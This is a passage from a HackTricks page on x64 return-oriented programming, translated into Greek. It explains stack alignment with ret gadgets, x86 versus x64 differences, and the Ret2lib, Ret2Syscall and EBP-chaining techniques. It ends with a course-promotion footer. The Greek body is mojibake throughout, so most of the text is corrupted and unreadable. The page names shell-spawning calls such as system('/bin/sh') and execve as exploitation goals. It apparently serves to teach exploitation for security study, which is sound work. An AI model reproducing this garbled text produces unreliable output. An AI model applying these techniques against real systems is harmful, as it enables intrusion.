* **`ret_gadget`** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± ÎµÏ…Î¸Ï…Î³ÏÎ¬Î¼Î¼Î¹ÏƒÎ· Î±Î½ Ï„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ ÏƒÏ„ÏŒÏ‡Î¿Ï‚ Ï„Î¿ Î±Ï€Î±Î¹Ï„ÎµÎ¯, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¿ ÏƒÏ…Î½Î·Î¸Î¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ **x64** Î³Î¹Î± Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¹ÏƒÏ„ÎµÎ¯ Î· ÏƒÏ‰ÏƒÏ„Î® ÎµÏ…Î¸Ï…Î³ÏÎ¬Î¼Î¼Î¹ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½.

### Stack Alignment

**Î¤Î¿ x86-64 ABI** Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶ÎµÎ¹ ÏŒÏ„Î¹ Î· **ÏƒÏ„Î¿Î¯Î²Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¸Ï…Î³ÏÎ±Î¼Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î± 16 byte** ÏŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± **ÎµÎ½Ï„Î¿Î»Î® ÎºÎ»Î®ÏƒÎ·Ï‚**. **LIBC**, Î³Î¹Î± Î½Î± Î²ÎµÎ»Ï„Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î·Î½ Î±Ï€ÏŒÎ´Î¿ÏƒÎ·, **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ SSE ÎµÎ½Ï„Î¿Î»Î­Ï‚** (ÏŒÏ€Ï‰Ï‚ **movaps**) Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„Î¿ÏÎ½ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ…Î¸Ï…Î³ÏÎ¬Î¼Î¼Î¹ÏƒÎ·. Î‘Î½ Î· ÏƒÏ„Î¿Î¯Î²Î± Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÏƒÏ‰ÏƒÏ„Î¬ ÎµÏ…Î¸Ï…Î³ÏÎ±Î¼Î¼Î¹ÏƒÎ¼Î­Î½Î· (ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î¿ **RSP** Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Î»Î±Ï€Î»Î¬ÏƒÎ¹Î¿ Ï„Î¿Ï… 16), Î¿Î¹ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÏƒÎµ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ ÏŒÏ€Ï‰Ï‚ **system** Î¸Î± Î±Ï€Î¿Ï„ÏÏ‡Î¿Ï…Î½ ÏƒÎµ Î¼Î¹Î± **ROP Î±Î»Ï…ÏƒÎ¯Î´Î±**. Î“Î¹Î± Î½Î± Ï„Î¿ Î´Î¹Î¿ÏÎ¸ÏÏƒÎµÏ„Îµ, Î±Ï€Î»Î¬ Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Î­Î½Î± **ret gadget** Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· **system** ÏƒÏ„Î·Î½ ROP Î±Î»Ï…ÏƒÎ¯Î´Î± ÏƒÎ±Ï‚.

## x86 vs x64 ÎºÏÏÎ¹Î± Î´Î¹Î±Ï†Î¿ÏÎ¬

{% hint style="success" %}
Î”ÎµÎ´Î¿Î¼Î­Î½Î¿Ï… ÏŒÏ„Î¹ Ï„Î¿ x64 Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î­Ï‚ Î³Î¹Î± Ï„Î± Ï€ÏÏÏ„Î± Î»Î¯Î³Î± ÎµÏ€Î¹Ï‡ÎµÎ¹ÏÎ®Î¼Î±Ï„Î±, ÏƒÏ…Ï‡Î½Î¬ Î±Ï€Î±Î¹Ï„ÎµÎ¯ Î»Î¹Î³ÏŒÏ„ÎµÏÎ± gadgets Î±Ï€ÏŒ Ï„Î¿ x86 Î³Î¹Î± Î±Ï€Î»Î­Ï‚ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½, Î±Î»Î»Î¬ Î· ÎµÏÏÎµÏƒÎ· ÎºÎ±Î¹ Î· Î±Î»Ï…ÏƒÎ¯Î´Ï‰ÏƒÎ· Ï„Ï‰Î½ ÏƒÏ‰ÏƒÏ„ÏÎ½ gadgets Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¿ Ï€ÎµÏÎ¯Ï€Î»Î¿ÎºÎ· Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… Î±Ï…Î¾Î·Î¼Î­Î½Î¿Ï… Î±ÏÎ¹Î¸Î¼Î¿Ï ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„ÏÎ½ ÎºÎ±Î¹ Ï„Î¿Ï… Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿Ï… Ï‡ÏÏÎ¿Ï… Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½. ÎŸ Î±Ï…Î¾Î·Î¼Î­Î½Î¿Ï‚ Î±ÏÎ¹Î¸Î¼ÏŒÏ‚ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„ÏÎ½ ÎºÎ±Î¹ Î¿ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ¿Ï‚ Ï‡ÏÏÎ¿Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ ÏƒÏ„Î·Î½ Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ® **x64** Ï€Î±ÏÎ­Ï‡Î¿Ï…Î½ Ï„ÏŒÏƒÎ¿ ÎµÏ…ÎºÎ±Î¹ÏÎ¯ÎµÏ‚ ÏŒÏƒÎ¿ ÎºÎ±Î¹ Ï€ÏÎ¿ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Ï„Î·Î½ Î±Î½Î¬Ï€Ï„Ï…Î¾Î· ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÏ‰Î½, ÎµÎ¹Î´Î¹ÎºÎ¬ ÏƒÏ„Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Ï„Î¿Ï… Return-Oriented Programming (ROP).
{% endhint %}

## Î ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/)

## Î†Î»Î»Î± Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± & Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## ROP Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ ROP ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»ÏÏ‚ Î¼Î¹Î± Ï„ÎµÏ‡Î½Î¹ÎºÎ® Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±. Î’Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÏ„Î¿ ROP, Î±Î½Î±Ï€Ï„ÏÏ‡Î¸Î·ÎºÎ±Î½ Ï€Î¿Î»Î»Î­Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Ret2XXX:

* **Ret2lib**: Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ ROP Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Î¼Î¹Î± Ï†Î¿ÏÏ„Ï‰Î¼Î­Î½Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Î¼Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿Ï…Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ (ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ ROP Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î¬ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎºÎ»Î®ÏƒÎ· ÏƒÎµ Î¼Î¹Î± syscall, Ï€.Ï‡. `execve`, ÎºÎ±Î¹ Î½Î± Ï„Î·Î½ ÎºÎ¬Î½ÎµÏ„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: Î¤Î¿ Ï€ÏÏÏ„Î¿ Î¸Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Ï„Î¿ EBP Î±Î½Ï„Î¯ Ï„Î¿Ï… EIP Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï„Î· ÏÎ¿Î® ÎºÎ±Î¹ Ï„Î¿ Î´ÎµÏÏ„ÎµÏÎ¿ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Ï„Î¿ Ret2lib Î±Î»Î»Î¬ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Î· ÏÎ¿Î® ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ ÎºÏ…ÏÎ¯Ï‰Ï‚ Î¼Îµ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ EBP (Î±Î½ ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î½Î± ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Ï„Î¿ EIP).

{% content-ref url="stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
